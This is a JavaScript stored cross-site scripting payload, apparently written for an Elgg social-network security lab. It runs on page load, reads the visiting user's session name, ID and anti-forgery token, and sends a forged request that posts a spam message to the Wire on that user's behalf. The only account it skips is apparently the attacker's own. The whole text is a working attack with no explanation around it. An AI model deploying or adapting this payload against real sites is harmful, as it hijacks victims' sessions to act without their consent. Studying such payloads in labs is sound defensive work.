<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var name = elgg.session.user.name;
	var guid = elgg.session.user.guid;
	console.log(guid);
	var foo = "Visit <a href='http://bing.com'>Bing</a>.";
	var post = "&body="+"To earn 12 USD/Hour(!), visit " + "http:\\\\www.xsslabelgg.com\\profile\\samy";
	//Construct the content of your url.
    var sendurl= "/action/thewire/add"; //FILL IN
	var content= token+ts+post; //FILL IN
	
	if(guid!=47)
		{
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>